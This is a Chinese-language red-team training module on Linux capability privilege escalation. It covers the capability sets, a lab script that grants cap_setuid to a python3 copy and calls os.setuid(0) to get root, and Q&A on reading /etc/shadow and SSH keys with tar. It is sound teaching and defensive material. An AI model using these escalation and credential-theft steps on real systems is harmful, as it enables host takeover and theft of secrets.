# R18.4 Linux Capabilities 特權原語濫用 (Capabilities Privilege Abuse)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Linux Capabilities 特權原語濫用** 的物理本質為**利用 Linux 核心將傳統粗粒度的 `root` (UID 0) 萬能特權切分為 40 餘種細粒度能力單位（Capabilities）的設計機制，當系統管理員或應用程式為了特定網路或系統操作為普通二進位檔案設置了過度寬鬆的延伸屬性（如 `cap_setuid+ep` 或 `cap_dac_read_search+ep`），攻擊者可直接繞過傳統檔案 SUID 檢查，調用具備特定權能的進程直接將進程身分提升為 root 或讀取全系統任意機密檔案**。在紅隊實戰中，管理員常以 Capabilities 取代 SUID 作為加固手段，但若未嚴格審計賦予的權能範圍，往往反而成為難以被常規審計腳本排查到的提權捷徑。

```
[取得低特權 Linux 本機存取] ── 搜尋具備可執行能力的二進位檔案: getcap -r / 2>/dev/null
                                     │
                                     ▼ 解析檔案繼承的 POSIX Capabilities 標籤
┌────────────────────────────────────┴───────────────────────────────────────────┐
│ 1. 高危權能 cap_setuid: 允許進程調用 setuid(0) 將自身身分任意切換至 root       │
│ 2. 高危權能 cap_dac_read_search: 允許進程忽略 DACL 讀取權限限制，讀取任意檔案   │
│ 3. 檢查目標二進位類型: python, perl, tar, vim, php, node 等直譯器或系統工具     │
└────────────────────────────────────┬───────────────────────────────────────────┘
                                     ▼
[匹配到危險權能 (如: /usr/bin/python3 = cap_setuid+ep)] ──► 調用 setuid(0) 原語
                                     │
                                     ▼ 在進程內部重設 EUID 與 GID 為 0
[衍生特權子進程: /bin/sh] ───────────► 成功以 root 身分接管主機！
```

## 🔬 第一動：POSIX Capabilities 架構、集合分類與 VFS 屬性物理機制 (Mechanics & Cap Sets)

### 1. Capabilities 集合分類與繼承邏輯
在 Linux 核心中，每個執行緒與檔案系統中的檔案具有三組核心能力集合：
- **Permitted (P)**：進程所能擁有的最大能力上限集合。
- **Effective (E)**：核心當前在執行特定系統調用（如 `sys_setuid`）時實際判斷的有效集合。
- **Inheritable (I)**：在執行 `execve()` 時能夠被子進程繼承的能力集合。

### 2. 檔案系統 VFS 擴充屬性存儲
檔案的 Capabilities 資訊並非記錄在傳統檔案權限欄位中，而是儲存在檔案系統的延伸屬性 (`xattr`) 命名空間中（`security.capability`）：
- 當二進位檔被設置 `cap_setuid+ep` 時，`+ep` 代表該權能同時進入 Permitted 與 Effective 集合。
- 任何使用者執行該檔案，核心呼叫 `execve()` 時自動將 `CAP_SETUID` 填入進程的 Effective 集合中，此時進程便具備無限制調用 `setuid(0)` 的權限！

## 🧪 實戰演練環境搭建 (Environment & Lab Setup)

### 1. 極簡 Capabilities 特權驗證腳本 (Bash, 20 行)
```bash
#!/bin/bash
# setup_cap_lab.sh
mkdir -p /tmp/cap_lab && cd /tmp/cap_lab
cp /usr/bin/python3 ./cap_python
sudo setcap cap_setuid+ep ./cap_python 2>/dev/null

echo "[*] Capabilities 測試環境就緒: $(getcap ./cap_python)"
echo "[*] 當前使用者: $(id)"

# 實施武器化提權驗證
./cap_python -c 'import os; os.setuid(0); os.system("id; echo FLAG{CAPABILITIES_PRIVESC_SUCCESS}")'

# 清理測試環境
rm -f ./cap_python
```

### 2. 三步作戰驗證流程
```bash
# 步驟 1: 執行腳本建立並驗證 Capabilities 標籤
bash setup_cap_lab.sh

# 步驟 2: 驗證物理特徵（確認輸出包含 uid=0(root) 與 FLAG）
# 驗證輸出：uid=0(root) ... FLAG{CAPABILITIES_PRIVESC_SUCCESS}

# 步驟 3: 驗證移除屬性（執行 setcap -r 消除安全隱患）
sudo setcap -r /tmp/cap_lab/cap_python 2>/dev/null
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：Linux Capabilities 設計的初衷為何？為何其可能引發與 SUID 相同的提權風險？**
  - **戰術思維**：初衷是將 root 特權細分以降低漏洞影響面；但若錯誤地將 `CAP_SETUID` 或 `CAP_DAC_READ_SEARCH` 賦予通用直譯器，等同於直接交出等同於 SUID 的完全控制權。
- [ ] **Q2：`cap_dac_override` 與 `cap_dac_read_search` 在提權利用上有何功能差別？**
  - **戰術思維**：`cap_dac_read_search` 允許忽略檔案讀取權限（適合讀取 `/etc/shadow`）；`cap_dac_override` 允許忽略檔案所有存取限制（可直接覆寫 `/etc/passwd`）。
- [ ] **Q3：在被限制的容器環境中，普通使用者如何排查當前進程擁有何種 Capabilities？**
  - **戰術思維**：查看 `/proc/self/status` 中的 `CapInh`, `CapPrm`, `CapEff`, `CapBnd` 欄位十六進制數值，並使用 `capsh --decode=<hex>` 還原具體名稱。
- [ ] **Q4：若發現 `/usr/bin/tar` 具備 `cap_dac_read_search+ep`，紅隊最佳利用路徑是什麼？**
  - **戰術思維**：利用 tar 將 `/etc/shadow` 或 root 家目錄下的私鑰 `~/.ssh/id_rsa` 打包導出至可讀取目錄，解開後提取密碼雜湊或金鑰登入。
- [ ] **Q5：藍隊如何從檔案系統層面杜絕管理員私下配置高危 Capabilities？**
  - **戰術思維**：在敏感分區掛載選項中加入 `nosuid` 與審計 xattr 擴充屬性，並透過 Falco 監控 `setcap` 系統調用執行。
